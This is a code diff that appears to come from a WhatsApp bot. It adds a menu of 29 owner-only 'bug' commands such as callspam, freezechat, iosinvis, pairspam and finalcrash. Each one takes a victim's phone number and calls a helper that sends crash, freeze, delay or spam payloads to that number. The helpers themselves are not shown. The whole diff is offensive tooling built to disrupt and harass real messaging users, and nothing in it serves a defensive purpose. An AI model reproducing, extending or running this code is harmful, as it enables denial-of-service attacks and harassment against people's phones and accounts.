@@ -1971,6 +1971,35 @@ case 'bugmenu': {
 ┃✮│➣ ${prefix}freeze [number]
 ┃✮│➣ ${prefix}uicrash [number]
 ┃✮│➣ ${prefix}locbug [number]
+┃✮│➣ ${prefix}album [number]
+┃✮│➣ ${prefix}callspam [number]
+┃✮│➣ ${prefix}delay [number]
+┃✮│➣ ${prefix}docbug [number]
+┃✮│➣ ${prefix}forceinvis [number]
+┃✮│➣ ${prefix}freezechat [number]
+┃✮│➣ ${prefix}invisbug [number]
+┃✮│➣ ${prefix}lockinvis [number]
+┃✮│➣ ${prefix}callbaron [number]
+┃✮│➣ ${prefix}harddelay [number]
+┃✮│➣ ${prefix}iosinvis [number]
+┃✮│➣ ${prefix}newblank [number]
+┃✮│➣ ${prefix}notifbug [number]
+┃✮│➣ ${prefix}apkdelay [number]
+┃✮│➣ ${prefix}delayv2 [number]
+┃✮│➣ ${prefix}blankdelay [number]
+┃✮│➣ ${prefix}nodecrash [number]
+┃✮│➣ ${prefix}invisdelay [number]
+┃✮│➣ ${prefix}betadelay [number]
+┃✮│➣ ${prefix}hardnewdelay [number]
+┃✮│➣ ${prefix}newbetadelay [number]
+┃✮│➣ ${prefix}losinvis [number]
+┃✮│➣ ${prefix}freezeblank [number]
+┃✮│➣ ${prefix}iosinvisv2 [number]
+┃✮│➣ ${prefix}pairspam [number]
+┃✮│➣ ${prefix}callpair [number]
+┃✮│➣ ${prefix}invisx2 [number]
+┃✮│➣ ${prefix}freezechat2 [number]
+┃✮│➣ ${prefix}finalcrash [number]
 ╰━━━━━━━━━━━━━━━━━━━━━┈⊷
 > ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𓆰⟵̠̽͢『🇮🇳』𝛲𝛨𝛰𝛯𝑁𝛪𝛸𝛸ᝰ.ː͢»𓆪`
 
@@ -2115,6 +2144,296 @@ case 'locbug': {
   reply(`🚀 ꜱᴇɴᴅɪɴɢ ʟᴏᴄᴀᴛɪᴏɴ ʙᴜɢ ᴛᴏ @${text}...`)
   await bugFuncs.LocaX(bad, target)
   reply('✅ ʟᴏᴄᴀᴛɪᴏɴ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'album': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}album 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴀʟʙᴜᴍ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.BlackBlankTotal(bad, target)
+  reply('✅ ᴀʟʙᴜᴍ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'callspam': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}callspam 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴄᴀʟʟ sᴘᴀᴍ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.CallSpam(bad, target)
+  reply('✅ ᴄᴀʟʟ sᴘᴀᴍ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'delay': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}delay 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴅᴇʟᴀʏ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DelayBug(bad, target)
+  reply('✅ ᴅᴇʟᴀʏ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'docbug': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴ!)')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}docbug 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴅᴏᴄᴜᴍᴇɴᴛ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DocumentUrlBug(bad, target)
+  reply('✅ ᴅᴏᴄᴜᴍᴇɴᴛ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'forceinvis': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}forceinvis 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ғᴏʀᴄᴇ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.ForceInvis(bad, target)
+  reply('✅ ғᴏʀᴄᴇ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'freezechat': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}freezechat 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ғʀᴇᴇᴢᴇ ᴄʜᴀᴛ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.FrezeChat(bad, target)
+  reply('✅ ғʀᴇᴇᴢᴇ ᴄʜᴀᴛ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'invisbug': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}invisbug 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.InvisibleX(bad, target)
+  reply('✅ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'lockinvis': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}lockinvis 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ʟᴏᴄᴋ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.LockInvis(bad, target)
+  reply('✅ ʟᴏᴄᴋ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'callbaron': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}callbaron 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴄᴀʟʟ ʙᴀʀᴏɴ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.CallBaron(bad, target)
+  reply('✅ ᴄᴀʟʟ ʙᴀʀᴏɴ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'harddelay': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}harddelay 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ʜᴀʀᴅ ᴅᴇʟᴀʏ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DelayHard(bad, target)
+  reply('✅ ʜᴀʀᴅ ᴅᴇʟᴀʏ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'iosinvis': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}iosinvis 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɪᴏs ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.InvisIos(bad, target)
+  reply('✅ ɪᴏs ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'newblank': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}newblank 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɴᴇᴡ ʙʟᴀɴᴋ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.NewBlank(bad, target)
+  reply('✅ ɴᴇᴡ ʙʟᴀɴᴋ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'notifbug': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}notifbug 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.BlankNotif(bad, target)
+  reply('✅ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'apkdelay': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}apkdelay 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴀᴘᴋ ᴅᴇʟᴀʏ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DelayApk(bad, target)
+  reply('✅ ᴀᴘᴋ ᴅᴇʟᴀʏ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'delayv2': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}delayv2 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴅᴇʟᴀʏ ᴠ𝟸 ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DelayV2(bad, target)
+  reply('✅ ᴅᴇʟᴀʏ ᴠ𝟸 ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'blankdelay': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}blankdelay 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ʙʟᴀɴᴋ ᴅᴇʟᴀʏ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.BlankXDelay(bad, target)
+  reply('✅ ʙʟᴀɴᴋ ᴅᴇʟᴀʏ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'nodecrash': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}nodecrash 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɴᴏᴅᴇ ᴄʀᴀsʜ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.CallCrashNode(bad, target)
+  reply('✅ ɴᴏᴅᴇ ᴄʀᴀsʜ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'invisdelay': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}invisdelay 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɪɴᴠɪsɪʙʟᴇ ᴅᴇʟᴀʏ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DelayInvis(bad, target)
+  reply('✅ ɪɴᴠɪsɪʙʟᴇ ᴅᴇʟᴀʏ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'betadelay': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}betadelay 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ʙᴇᴛᴀ ᴅᴇʟᴀʏ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DelayBeta(bad, target)
+  reply('✅ ʙᴇᴛᴀ ᴅᴇʟᴀʏ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'hardnewdelay': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}hardnewdelay 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ʜᴀʀᴅ ɴᴇᴡ ᴅᴇʟᴀʏ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DelayHardNew(bad, target)
+  reply('✅ ʜᴀʀᴅ ɴᴇᴡ ᴅᴇʟᴀʏ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'newbetadelay': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}newbetadelay 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɴᴇᴡ ʙᴇᴛᴀ ᴅᴇʟᴀʏ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.DelayNewBeta(bad, target)
+  reply('✅ ɴᴇᴡ ʙᴇᴛᴀ ᴅᴇʟᴀʏ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'losinvis': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}losinvis 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ʟᴏsᴇ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.ForceLoseInvis(bad, target)
+  reply('✅ ʟᴏsᴇ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'freezeblank': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}freezeblank 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ғʀᴇᴇᴢᴇ ʙʟᴀɴᴋ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.FrezeBlank(bad, target)
+  reply('✅ ғʀᴇᴇᴢᴇ ʙʟᴀɴᴋ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'iosinvisv2': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}iosinvisv2 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɪᴏs ɪɴᴠɪsɪʙʟᴇ ᴠ𝟸 ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.IosInvisible(bad, target)
+  reply('✅ ɪᴏs ɪɴᴠɪsɪʙʟᴇ ᴠ𝟸 ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'pairspam': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}pairspam 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴘᴀɪʀɪɴɢ sᴘᴀᴍ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.PairingSpam(bad, target)
+  reply('✅ ᴘᴀɪʀɪɴɢ sᴘᴀᴍ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'callpair': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}callpair 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ᴄᴀʟʟ ᴘᴀɪʀ sᴘᴀᴍ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.CallSpamPairing(bad, target)
+  reply('✅ ᴄᴀʟʟ ᴘᴀɪʀ sᴘᴀᴍ ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'invisx2': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}invisx2 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ɪɴᴠɪsɪʙʟᴇ ᴠ𝟸 ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.InvisibleX2(bad, target)
+  reply('✅ ɪɴᴠɪsɪʙʟᴇ ᴠ𝟸 ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'freezechat2': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}freezechat2 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ғʀᴇᴇᴢᴇ ᴄʜᴀᴛ ᴠ𝟸 ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.FreezeChat2(bad, target)
+  reply('✅ ғʀᴇᴇᴢᴇ ᴄʜᴀᴛ ᴠ𝟸 ʙᴜɢ sᴇɴᴛ!')
+}
+break
+
+case 'finalcrash': {
+  if (!isCreator) return reply('❌ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!')
+  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}finalcrash 880xxxxxxxxx`)
+  let target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+  reply(`🚀 ꜱᴇɴᴅɪɴɢ ғɪɴᴀʟ ᴄʀᴀsʜ ʙᴜɢ ᴛᴏ @${text}...`)
+  await bugFuncs.CallCrashFinal(bad, target)
+  reply('✅ ғɪɴᴀʟ ᴄʀᴀsʜ ʙᴜɢ sᴇɴᴛ!')
 }
 break
 
